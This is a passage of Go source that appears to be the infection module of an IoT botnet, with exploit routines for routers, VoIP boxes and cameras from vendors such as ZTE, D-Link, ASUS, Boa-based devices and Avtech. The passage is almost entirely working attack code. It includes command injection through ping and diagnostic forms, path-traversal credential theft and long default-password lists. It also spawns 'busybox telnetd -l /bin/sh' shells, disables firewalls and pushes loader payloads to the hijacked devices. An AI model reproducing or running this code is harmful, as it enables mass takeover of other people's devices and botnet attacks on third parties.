		bytebuf := make([]byte, 2048)
		l, err := conn.Read(bytebuf)
		if err != nil || l <= 0 {
			zeroByte(bytebuf)
			conn.Close()
			return
		}

		if !strings.Contains(string(bytebuf), "var loc = 'zhnping.cmd?'") {
			zeroByte(bytebuf)
			conn.Close()
			continue
		}

		if strings.Contains(string(bytebuf), "HTTP/1.1 200") || strings.Contains(string(bytebuf), "HTTP/1.0 200") {
			sessionKey = getStringInBetween(string(bytebuf), "var sessionKey='", "';")
			authPos = i
			isAuted = 1
			zeroByte(bytebuf)
			conn.Close()
			break
		} else {
			zeroByte(bytebuf)
			conn.Close()
			continue
		}
	}

	if isAuted == 0 || sessionKey == "null" {
		return
	}

	conn, err = net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return
	}

	setWriteTimeout(conn, 10)

	auth := base64.StdEncoding.EncodeToString([]byte(logins[authPos]))
	req := "GET /zhnping.cmd?&test=ping&sessionKey=" + sessionKey + "&ipAddr=;" + zhonePayload + "&count=4&length=64 HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Language: sv-SE,sv;q=0.8,en-US;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nReferer: http://" + target + "/diag.html\r\nAuthorization: Basic " + auth + "\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"
	conn.Write([]byte(req))

	fmt.Printf("\x1b[38;5;46mZhone:"+login+"\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m payload sent to device\x1b[38;5;15m\r\n", target)
	payloadSent++

	setReadTimeout(conn, 10)
	bytebuf = make([]byte, 2048)
	l, err = conn.Read(bytebuf)
	if err != nil || l <= 0 {
		zeroByte(bytebuf)
		conn.Close()
		return
	}

	zeroByte(bytebuf)
	conn.Close()
}

func infectFaith(target string) {
	data := url.Values{}
	endpoint := "http://" + target + "/apply.cgi"
	data.Set("submit_button", "Ping")
	data.Set("action", "ApplyTake")
	data.Set("submit_type", "start")
	data.Set("del_value", "")
	data.Set("change_action", "gozila_cgi")
	data.Set("next_page", "Diagnostics.asp")
	data.Set("ping_ip", faithPayload)

	client := &http.Client{}
	r, err := http.NewRequest("POST", endpoint, strings.NewReader(data.Encode()))
	if err != nil {
		return
	}

	r.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	r.Header.Add("Content-Length", strconv.Itoa(len(data.Encode())))
	r.SetBasicAuth("admin", "admin")
	r.Header.Add("Origin", "http://"+target)
	r.Header.Add("User-Agent", userAgent)
	r.Header.Add("Sec-GPC", "1")
	r.Header.Add("Referer", endpoint)
	r.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9")
	res, err := client.Do(r)
	if err != nil {
		return
	}

	if res.StatusCode == 200 {
		fmt.Printf("\x1b[38;5;46mFaith\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m payload sent to device\x1b[38;5;15m\r\n", target)
		return
	}
}

func getCookie(conn net.Conn, target string) (int, string) {

	conn.Write([]byte("POST /cgi-bin/webctrl.cgi HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 115\r\nConnection: keep-alive\r\nReferer: http://125.62.218.180:8080/cgi-bin/webctrl.cgi?action=sysinfo_page\r\nCookie: sesskey=\r\nUpgrade-Insecure-Requests: 1\r\n\r\naction=login_authentication&redirect_action=sysinfo_page&login_username=blueangel&login_password=blueangel&B1=Login\n\n"))

	bytebuf := make([]byte, 256)
	l, err := conn.Read(bytebuf)
	if err != nil || l <= 0 {
		return 0, ""
	}

	if !strings.Contains(string(bytebuf), "200") {
		return 0, ""
	}

	zeroByte(bytebuf)
	bytebuf = make([]byte, 256)
	l, err = conn.Read(bytebuf)
	if err != nil || l <= 0 {
		return 0, ""
	}

	deviceCookie := getStringInBetween(string(bytebuf), "Set-Cookie: ", "; path=/")
	if len(deviceCookie) < 5 {
		return 0, ""
	}

	if !strings.Contains(deviceCookie, "sesskey") {
		return 0, ""
	}

	conn.Close()
	return 1, deviceCookie
}

func infectVoip(target string) {
	conn, err := net.DialTimeout("tcp", target, 10*time.Second)

	if err != nil {
		return
	}

	defer conn.Close()
	conn.SetDeadline(time.Now().Add(10 * time.Second))

	ret, deviceCookie := getCookie(conn, target)
	if ret == 0 {
		return
	}

	conn, err = net.DialTimeout("tcp", target, 10*time.Second)

	if err != nil {
		return
	}

	splitStr := strings.Split(target, ":")

	conn.Write([]byte("GET /cgi-bin/webctrl.cgi?action=pingtest_update&ping_addr=127.0.0.1;busybox%20telnetd%20-p%209002%20-l%20%2Fbin%2Fsh&B1=PING HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nCookie: " + deviceCookie + "\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"))
	fmt.Printf("\x1b[38;5;46mVoip\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m payload sent to device\x1b[38;5;15m\r\n", target)
	payloadSent++

	time.Sleep(10 * time.Second)

	telnetLoader(splitStr[0]+":9002", 0, "arm5", loaderVoipTag, "pkill -9 telnetd; killall telnetd")
}

func loginOGZte(target string) {
	conn, err := net.DialTimeout("Tcp", target, 10*time.Second)

	if err != nil {
		return
	}

	defer conn.Close()

	conn.Write([]byte("POST /login.gch HTTP/1.1\r\nHost: 127.0.0.1:8083\r\nUser-Agent: " + userAgent + "\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nContent-Length: 53\r\n\r\nFrm_Logintoken=4&Username=root&Password=W%21n0%26oO7."))
}

func infectOGZte(target string) {

	loginOGZte(target)

	conn, err := net.DialTimeout("Tcp", target, 10*time.Second)

	if err != nil {
		return
	}

	defer conn.Close()

	request := "&Host=;$(" + zteOGPayload + ")&NumofRepeat=1&DataBlockSize=64&DiagnosticsState=Requested&IF_ACTION=new&IF_IDLE=submit"

	cnt_len := strconv.Itoa(len(request))

	conn.Write([]byte("POST /manager_dev_ping_t.gch HTTP/1.1\r\nHost: 127.0.0.1:8083\r\nContent-Length: " + cnt_len + "\r\nConnection: keep-alive\r\nUser-Agent: " + userAgent + "\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\n\r\n" + request))
	fmt.Printf("\x1b[38;5;46mOGZte\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m payload sent to device\x1b[38;5;15m\r\n", target)
}

func infectDCSDlink(target string) {

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return
	}

	setWriteTimeout(conn, 10)
	conn.Write([]byte("GET /config/getuser?index=0 HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"))

	setReadTimeout(conn, 10)
	bytebuf := make([]byte, 512)
	l, err := conn.Read(bytebuf)
	if err != nil || l <= 0 {
		zeroByte(bytebuf)
		conn.Close()
		return
	}

	stipByte(bytebuf)
	conn.Close()

	if strings.Contains(string(bytebuf), "name=") && strings.Contains(string(bytebuf), "pass=") && strings.Contains(string(bytebuf), "priv=") {
	} else {
		zeroByte(bytebuf)
		return
	}

	usernameIn := getStringInBetween(string(bytebuf), "name=", "pass=")
	passwordIn := getStringInBetween(string(bytebuf), "pass=", "priv=")

	username := strings.Map(func(r rune) rune {
		if unicode.IsGraphic(r) {
			return r
		}
		return -1
	}, usernameIn)

	password := strings.Map(func(r rune) rune {
		if unicode.IsGraphic(r) {
			return r
		}
		return -1
	}, passwordIn)

	if len(username) <= 0 || len(password) <= 0 {
		zeroByte(bytebuf)
		return
	} else {
		zeroByte(bytebuf)
	}

	b64auth := base64.StdEncoding.EncodeToString([]byte(username + ":" + password))

	conn, err = net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return
	}

	setWriteTimeout(conn, 10)
	conn.Write([]byte("GET /cgi-bin/ddns_enc.cgi?enable=1&hostname=qq&interval=24&servername=www.dlinkddns.com&provider=custom&account=;" + dlinkDcsPayload + "; HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nAccept: */*\r\nAuthorization: Basic " + b64auth + "\r\n\r\n"))

	setReadTimeout(conn, 10)
	l, err = conn.Read(bytebuf)
	if err != nil || l <= 0 {
		zeroByte(bytebuf)
		conn.Close()
		return
	}

	conn.Close()
	time.Sleep(15 * time.Second)

	conn, err = net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return
	}

	setWriteTimeout(conn, 10)
	conn.Write([]byte("GET /cgi-bin/ddns_enc.cgi?enable=0&hostname=qq&interval=24&servername=www.dlinkddns.com&provider=custom&account=aaaa HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nAccept: */*\r\nAuthorization: Basic " + b64auth + "\r\n\r\n"))

	setReadTimeout(conn, 10)
	l, err = conn.Read(bytebuf)
	if err != nil || l <= 0 {
		zeroByte(bytebuf)
		conn.Close()
		return
	}

	if strings.Contains(string(bytebuf), "service=www.dlinkddns.com") {
		fmt.Printf("\x1b[38;5;46mDcsDlink:"+username+":"+password+"\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m payload sent to device\x1b[38;5;15m\r\n", target)
		payloadSent++
	}

	conn.Close()
	return

}

func SpaingetCredential(target string) string {
	conn, err := net.DialTimeout("tcp", target, 10*time.Second)

	if err != nil {
		return ""
	}

	conn.SetReadDeadline(time.Now().Add(10 * time.Second))

	conn.Write([]byte("GET /\\.gif\\..\\adm\\management.asp HTTP/1.1\r\nUser-Agent: curl/7.68.0\r\nAccept: */*\r\n\r\n"))
	defer conn.Close()

	var rdbuf []byte = []byte("")

	for {
		tmpbuf := make([]byte, 1024)
		ln, err := conn.Read(tmpbuf)
		if ln <= 0 || err != nil {
			break
		}

		rdbuf = append(rdbuf, tmpbuf...)

		nextbuf := strings.Split(string(rdbuf), "var passadm = \"")

		if len(nextbuf) > 1 {
			password := strings.Split(nextbuf[1], "\";")
			return password[0]
		}
	}

	return ""
}

func SpainsetAuth(target string, password string) {
	conn, err := net.DialTimeout("tcp", target, 10*time.Second)

	if err != nil {
		return
	}

	conn.SetReadDeadline(time.Now().Add(10 * time.Second))

	data := fmt.Sprintf("loginUser=admin&loginPass=%s", password)
	content_len := len(data)

	request := fmt.Sprintf("POST /goform/setAuth HTTP/1.1\r\nUser-Agent: curl/7.68.0\r\nAccept: */*\r\nContent-Length: %d\r\n\r\n%s", content_len, data)
	conn.Write([]byte(request))
}

func spainSendInfect(target string) {
	conn, err := net.DialTimeout("tcp", target, 10*time.Second)

	if err != nil {
		return
	}

	conn.SetReadDeadline(time.Now().Add(10 * time.Second))

	data := "tool=0&pingCount=4&host=%24%28" + spainPayload + "%29&sumbit=OK"
	content_len := len(data)

	request := fmt.Sprintf("POST /goform/sysTools HTTP/1.1\r\nUser-Agent: curl/7.68.0\r\nAccept: */*\r\nContent-Length: %d\r\n\r\n%s", content_len, data)
	conn.Write([]byte(request))
}

func infectFunctionSpain(target string) {
	password := SpaingetCredential(target)

	if password == "" {
		return
	}

	fmt.Printf("\x1b[38;5;46mSpain:admin:"+password+"\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m payload sent to device\x1b[38;5;15m\r\n", target)
	payloadSent++

	SpainsetAuth(target, password)
	spainSendInfect(target)
}

func findDeviceType(target, auth string) int {
	var foundSyscmd bool = false

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)

	if err != nil {
		return 0
	}

	defer conn.Close()

	conn.Write([]byte("GET /syscmd.htm HTTP/1.0\r\nOrigin: http://" + target + "\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: " + userAgent + "\r\nConnection: keep-alive\r\nReferer: http://" + target + "/syscmd.htm\r\nAuthorization: Basic " + auth + "\r\n\r\n"))

	for {
		buff := make([]byte, 8096)
		len, err := conn.Read(buff)

		if err != nil {
			break
		}

		if len <= 0 {
			break
		}

		if strings.Contains(string(buff), "200 OK") {
			foundSyscmd = true

			if strings.Contains(string(buff), "sysCmdType") {
				return 1
			}
		}
	}

	if foundSyscmd {
		return 2
	}

	return 3
}

func BoaconfirmRequest(target, auth string) {
	conn, err := net.DialTimeout("tcp", target, 10*time.Second)

	if err != nil {
		return
	}

	defer conn.Close()

	conn.Write([]byte("GET /syscmd.htm HTTP/1.0\r\nOrigin: http://" + target + "\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: " + userAgent + "\r\nConnection: keep-alive\r\nReferer: http://" + target + "/syscmd.htm\r\nAuthorization: Basic " + auth + "\r\n\r\n"))

	buff := make([]byte, 1024)
	conn.Read(buff)
}

func BoapingInjection(target, cmd, auth string) bool {
	conn, err := net.DialTimeout("tcp", target, 10*time.Second)

	if err != nil {
		return false
	}

	defer conn.Close()

	cnt_len := strconv.Itoa((109 + len(cmd)))
	conn.Write([]byte("POST /boafrm/formSysCmd HTTP/1.0\r\nHost: " + target + "\r\nOrigin: http://" + target + "\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: " + userAgent + "\r\nConnection: keep-alive\r\nReferer: http://" + target + "/syscmd.htm\r\nContent-Length: " + cnt_len + "\r\nAuthorization: Basic " + auth + "\r\n\r\nsubmit-url=%2Fsyscmd.htm&sysCmd=ping&sysMagic=&sysCmdType=ping&checkNum=&sysHost=%3B" + cmd + "&apply=+Salvar+%26+Aplicar&msg="))

	buff := make([]byte, 1024)
	conn.Read(buff)

	return strings.Contains(string(buff), "302")
}

func BoasysCmdInjection(target, cmd, auth string) bool {
	conn, err := net.DialTimeout("tcp", target, 10*time.Second)

	if err != nil {
		return false
	}

	defer conn.Close()

	len := strconv.Itoa((59 + len(cmd)))

	conn.Write([]byte("POST /boafrm/formSysCmd HTTP/1.1\r\nUser-Agent: " + userAgent + "\r\nContent-Length: " + len + "\r\nAuthorization: Basic " + auth + "\r\n\r\nsysMagic=&sysCmd=" + cmd + "&apply=Apply&submit-url=%2Fsyscmd.htm&msg="))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), "302")
}

func BoafindDevice(target string) bool {
	conn, err := net.DialTimeout("tcp", target, 10*time.Second)

	if err != nil {
		return false
	}

	defer conn.Close()

	conn.Write([]byte("GET / HTTP/1.1\r\nUser-Agent: " + userAgent + "\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	if strings.Contains(buff.String(), "Server: Boa") || strings.Contains(buff.String(), "Server: eCos") {
		return strings.Contains(buff.String(), "WWW-Authenticate: Basic")
	}

	return false
}

func BoafindCredential(target string) string {
	var creds = []string{"admin:admin", "user:user", "admin:1234", "admin:12345", "admin:123456", "admin:54321", "admin:password", "admin:", "admin:admin123"}

	for _, cred := range creds {
		auth := base64.StdEncoding.EncodeToString([]byte(cred))

		conn, err := net.DialTimeout("tcp", target, 10*time.Second)

		if err != nil {
			return ""
		}

		defer conn.Close()
		conn.Write([]byte("GET / HTTP/1.1\r\nUser-Agent: " + userAgent + "\r\nAuthorization: Basic " + auth + "\r\nConnection: keep-alive\r\n\r\n"))

		buff := make([]byte, 1024)
		conn.Read(buff)

		if strings.Contains(string(buff), "HTTP/1.1 200 OK") && strings.Contains(string(buff), "url=index.htm") {
			return cred
		}
	}

	return ""
}

func exploitBoaPing(target, cred, auth string) {

	telnetPort := strconv.Itoa(rand.Intn(50000) + 10000)

	if BoapingInjection(target, "iptables+-A+INPUT+-p+tcp+--dport+"+telnetPort+"+-j+ACCEPT", auth) {
		BoaconfirmRequest(target, auth)

		/*  just a blind wget payload for the lolz */
		BoapingInjection(target, boaPayload, auth)
		BoaconfirmRequest(target, auth)

		if BoapingInjection(target, "busybox+telnetd+-p"+telnetPort+"+-l+%2Fbin%2Fsh", auth) {
			BoaconfirmRequest(target, auth)

			fmt.Printf("\x1b[38;5;46mBoa:"+cred+"\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m payload sent to device with ping injection\x1b[38;5;15m\r\n", target)

			logDevice(target, "boa")

			time.Sleep(10 * time.Second)

			splitStr := strings.Split(target, ":")

			telnetLoader(splitStr[0]+":"+telnetPort, 0, "mpsl", loaderBoaTag, "")
			telnetLoader(splitStr[0]+":"+telnetPort, 0, "mips", loaderBoaTag, "pkill -9 telnetd; killall telnetd; killall busybox")
			return
		}
	}
}

func exploitBoaSyscmd(target, cred, auth string) {

	telnetPort := strconv.Itoa(rand.Intn(50000) + 10000)

	if BoasysCmdInjection(target, "iptables+-A+INPUT+-p+tcp+--dport+"+telnetPort+"+-j+ACCEPT", auth) {
		BoaconfirmRequest(target, auth)

		/*  just a blind wget payload for the lolz */
		BoasysCmdInjection(target, boaPayload, auth)
		BoaconfirmRequest(target, auth)

		if BoasysCmdInjection(target, "busybox+telnetd+-p"+telnetPort+"+-l+%2Fbin%2Fsh", auth) {
			BoaconfirmRequest(target, auth)

			fmt.Printf("\x1b[38;5;46mBoa:"+cred+"\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m payload sent to device with syscmd\x1b[38;5;15m\r\n", target)

			logDevice(target, "boa")

			time.Sleep(10 * time.Second)

			splitStr := strings.Split(target, ":")

			telnetLoader(splitStr[0]+":"+telnetPort, 0, "mips", loaderBoaTag, "")
			telnetLoader(splitStr[0]+":"+telnetPort, 0, "mpsl", loaderBoaTag, "pkill -9 telnetd; killall telnetd; killall busybox")
			return
		}
	}
}

func exploitBoaUnknown(target, cred, auth string) {
	//fmt.Printf("\x1b[38;5;46mBoa:" + cred + "\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m unknown for infection\x1b[38;5;15m\r\n", target)
}

func infectFunctionBoa(target string) {

	cred := BoafindCredential(target)
	auth := base64.StdEncoding.EncodeToString([]byte(cred))

	if len(cred) <= 0 {
		return
	}

	BoaconfirmRequest(target, auth)

	deviceType := findDeviceType(target, auth)

	if deviceType > 0 {

		switch deviceType {

		case 1:
			exploitBoaPing(target, cred, auth)
		case 2:
			exploitBoaSyscmd(target, cred, auth)
		case 3:
			exploitBoaUnknown(target, cred, auth)
		}
	}
}

func asusSendConfirm(target, telnetPort, auth, cred string) bool {
	conn, err := net.DialTimeout("tcp", target, 10*time.Second)

	if err != nil {
		return false
	}

	defer conn.Close()
	conn.SetDeadline(time.Now().Add(10 * time.Second))

	conn.Write([]byte("GET /Main_Analysis_Content.asp HTTP/1.0\r\nAuthorization: Basic " + auth + "\r\n\r\n"))

	var buffer bytes.Buffer
	io.Copy(&buffer, conn)

	if strings.Contains(buffer.String(), "HTTP/1.0 200 Ok") {

		fmt.Printf("\x1b[38;5;46mAsusRT:"+cred+"\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m opened telnet port "+telnetPort+"\x1b[38;5;15m\r\n", target)

		logDevice(target, "asusrt")

		time.Sleep(10 * time.Second)

		ip := strings.Split(target, ":")
		telnetLoader(ip[0]+":"+telnetPort, 0, "mpsl", loaderAsusTag, "")
		telnetLoader(ip[0]+":"+telnetPort, 0, "mips", loaderAsusTag, "pkill -9 telnetd; killall telnetd; killall busybox")

		return true
	}

	return false
}

func findAsusRTAuth(target string) string {
	conn, err := net.DialTimeout("tcp", target, 10*time.Second)

	if err != nil {
		return ""
	}

	defer conn.Close()
	conn.SetDeadline(time.Now().Add(10 * time.Second))

	conn.Write([]byte("GET /error_page.htm HTTP/1.0\r\nUser-Agent: " + userAgent + "\r\nConnection: close\r\n\r\n"))

	var buffer bytes.Buffer
	io.Copy(&buffer, conn)

	re := regexp.MustCompile(`if\('1' == '0' \|\| '(.+?)' == '(.+?)'\)`)
	auth := re.FindAllString(buffer.String(), -1)

	if len(auth) == 0 {
		return ""
	}

	login := strings.Split(auth[0], "if('1' == '0' || '")[1]
	password := strings.Split(login, "'")[0]

	return password
}

func resetasusRTFirewall(target, cred string) bool {
	conn, err := net.DialTimeout("tcp", target, 10*time.Second)

	if err != nil {
		return false
	}

	defer conn.Close()
	conn.SetDeadline(time.Now().Add(10 * time.Second))

	auth := base64.StdEncoding.EncodeToString([]byte(cred))

	// think so
	conn.Write([]byte("POST /start_apply.htm HTTP/1.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nUser-Agent: " + userAgent + "\r\nReferer: http://" + target + "/Main_Analysis_Content.asp\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nContent-Length: 324\r\nHost: " + target + "\r\nAuthorization: Basic " + auth + "\r\n\r\ncurrent_page=Advanced_BasicFirewall_Content.asp&next_page=&next_host=212.75.138.206%3A8080&group_id=&modified=0&action_wait=5&action_mode=apply&action_script=restart_firewall&first_time=&preferred_lang=EN&firmver=3.0.0.4&fw_enable_x=0&fw_dos_x=0&misc_ping_x=0&st_webdav_mode=0&webdav_http_port=&webdav_https_port=&FAQ_input="))

	var buffer bytes.Buffer
	io.Copy(&buffer, conn)

	return strings.Contains(buffer.String(), "HTTP/1.0 200 Ok")
}

func exploitAusRT(target, cred string) bool {
	conn, err := net.DialTimeout("tcp", target, 10*time.Second)

	if err != nil {
		return false
	}

	defer conn.Close()
	conn.SetDeadline(time.Now().Add(10 * time.Second))

	auth := base64.StdEncoding.EncodeToString([]byte(cred))

	/* even if we cant reset it, we'll try anyways */
	if !resetasusRTFirewall(target, cred) {
		//fmt.Printf("[ASUS] failed to reset firewall for %s (%s)\n", target, cred)
		return false
	}

	telnetPort := strconv.Itoa(rand.Intn(50000) + 10000)

	// think so
	conn.Write([]byte("GET /apply.cgi?current_page=Main_Analysis_Content.asp&next_page=Main_Analysis_Content.asp&group_id=&modified=0&action_mode=+Refresh+&action_script=&action_wait=&first_time=&preferred_lang=EN&SystemCmd=ping+-c+5+%24%28busybox+telnetd+-p" + telnetPort + "+-l+%2Fbin%2Fsh%29&firmver=3.0.0.4&cmdMethod=ping&destIP=%24%28busybox+telnetd+-p" + telnetPort + "+-l+%2Fbin%2Fsh%29&pingCNT=1 HTTP/1.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nUser-Agent: " + userAgent + "\r\nReferer: http://" + target + "/Main_Analysis_Content.asp\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nHost: " + target + "\r\nAuthorization: Basic " + auth + "\r\n\r\n"))

	return asusSendConfirm(target, telnetPort, auth, cred)
}

func asusFindWebserver(target string) bool {
	conn, err := net.DialTimeout("tcp", target, 10*time.Second)

	if err != nil {
		return false
	}

	defer conn.Close()
	conn.SetDeadline(time.Now().Add(10 * time.Second))
	conn.Write([]byte("GET / HTTP/1.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nUser-Agent: " + userAgent + "\r\nReferer: http://" + target + "/Main_Analysis_Content.asp\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nHost: " + target + "\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), "Server: httpd")
}

func infectAsusRT(target string) {
	var creds = []string{"admin:Wf@b9?hJ", "admin:admin", "admin:password", "admin:asus", "admin:", "admin:admin1", "admin:admin1520", "admin:sakura1980", "admin:7120045", "admin:mp22vml108", "admin:ch7L3d9G", "admin:16032002", "admin:77553277", "admin:906Spirit777", "admin:admin1234", "admin:0389slam", "admin:This1sWiFi", "admin:Kwiki!2345!", "admin:&#38#fed73TRJNoi7()", "admin:Ghbvtytybt!", "admin:ZZprigorel123", "admin:ss127497oo", "admin:admin@", "admin:vor147", "admin:1985FybrbY5891", "admin:mQArq777tH9i!tG", "admin:nicepswd77", "admin:487317sokol", "admin:971CV1n8", "admin:Boriss333", "admin:mertx", "admin:YtnvBhfGodokbdvb", "admin:11051996m", "admin:bsa299yeb", "admin:rio13hih", "admin:pass33world", "admin:307750dv", "admin:ybpfrc2107", "admin:iatianymatonv", "admin:Dahuaforall1803", "admin:Miyagi0508!", "admin:g32167890", "admin:MaxAlex#123", "admin:3333333s", "admin:iberov", "admin:0000", "admin:5v/bb5ii"}

	if !asusFindWebserver(target) {
		return
	}

	pass := findAsusRTAuth(target)

	if len(pass) > 0 {

		fmt.Printf("\x1b[38;5;46mAsusRT:admin:"+pass+"\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m found login\x1b[38;5;15m\r\n", target)

		if exploitAusRT(target, "admin:"+pass) {
			return
		}
	}

	for _, cred := range creds {
		if exploitAusRT(target, cred) {
			return
		}
	}
}

func leakCred(target string) {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return
	}

	defer conn.Close()

	conn.Write([]byte("GET / IPCP/1.0\r\nMessage-ID: 29\r\nConnection: close\r\nContent-Length: 39\r\n\r\n../../../../../mnt/database/xml/Account"))
}

func checkCredLeak(target string) (string, string) {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return "", ""
	}

	defer conn.Close()

	conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\n\r\n"))

	var rdbuf []byte = []byte("")

	for {
		tmpbuf := make([]byte, 128)
		ln, err := conn.Read(tmpbuf)
		if ln <= 0 || err != nil {
			break
		}

		rdbuf = append(rdbuf, tmpbuf...)
		if strings.Contains(string(rdbuf), "HTTP/1.0 200 OK") && strings.Contains(string(rdbuf), "{\"errCode\":0}") {
			fmt.Printf("\x1b[38;5;46mTenda\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m payload sent to device\x1b[38;5;15m\r\n", target)
			payloadSent++
			break
		}
	}

	if strings.Contains(string(rdbuf), "<Username Level=\"40/40\" Dispatch=\"account\">") {

		buff := strings.Split(string(rdbuf), "<Username Level=\"40/40\" Dispatch=\"account\">")

		if len(buff) > 1 {
			username := strings.Split(buff[1], "</")

			buff2 := strings.Split(string(rdbuf), "<User1>")

			if len(buff2) > 1 {
				passBuff := strings.Split(buff2[1], "Password Level=\"40/40\" Dispatch=\"account\">")

				if len(passBuff) > 1 {
					password := strings.Split(passBuff[1], "</")

					if len(password) > 0 {
						return username[0], password[0]
					}
				}
			}
		}
	} else {

		buff := strings.Split(string(rdbuf), "<Username Level=\"40/40\">")

		if len(buff) > 1 {
			username := strings.Split(buff[1], "</")

			buff2 := strings.Split(string(rdbuf), "<User1>")

			if len(buff2) > 1 {
				passBuff := strings.Split(buff2[1], "Password Level=\"40/40\">")

				if len(passBuff) > 1 {
					password := strings.Split(passBuff[1], "</")

					if len(password) > 0 {
						return username[0], password[0]
					}
				}
			}
		}

	}

	return "", ""
}

func loginDevice(target, auth string) bool {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	defer conn.Close()

	req := "GET /cgi-bin/nobody/VerifyCode.cgi?account=" + auth + "&login=quick HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\n\r\n"
	conn.Write([]byte(req))

	for {
		tmpbuf := make([]byte, 128)
		ln, err := conn.Read(tmpbuf)

		if ln <= 0 || err != nil {
			break
		}
	}

	return true
}

func avtechChangePassBack(target, username, password string) {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return
	}

	defer conn.Close()

	// admin:botnet
	rce := "$(" + avtechPayload + ")"
	auth := base64.StdEncoding.EncodeToString([]byte(username + ":" + rce))

	newauth := base64.StdEncoding.EncodeToString([]byte("botnet"))

	req := "GET /cgi-bin/nobody/Machine.cgi?action=change_password&account=" + auth + "&new_password=" + newauth + " HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nCookie: x=1; SSID=" + auth + "; LifeTime=; IdleTime=15; userCh=1; ReloWebTime=0\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\n"

	conn.SetDeadline(time.Now().Add(10 * time.Second))
	conn.Write([]byte(req))

	for {
		tmpbuf := make([]byte, 128)
		ln, err := conn.Read(tmpbuf)

		if ln <= 0 || err != nil {
			break
		}
	}
}

func avTechSendPayload(target, auth string) {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return
	}

	defer conn.Close()

	rce := "$(" + avtechPayload + ")"
	encodedRce := base64.StdEncoding.EncodeToString([]byte(rce))

	req := "GET /cgi-bin/nobody/Machine.cgi?action=change_password&account=" + auth + "&new_password=" + encodedRce + " HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nCookie: x=1; SSID=" + auth + "; LifeTime=; IdleTime=15; userCh=1; ReloWebTime=0\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\n"
	conn.Write([]byte(req))

	for {
		tmpbuf := make([]byte, 128)
		ln, err := conn.Read(tmpbuf)

		if ln <= 0 || err != nil {
			break
		}
	}
}

func infectAvtech(target string) {

	leakCred(target)

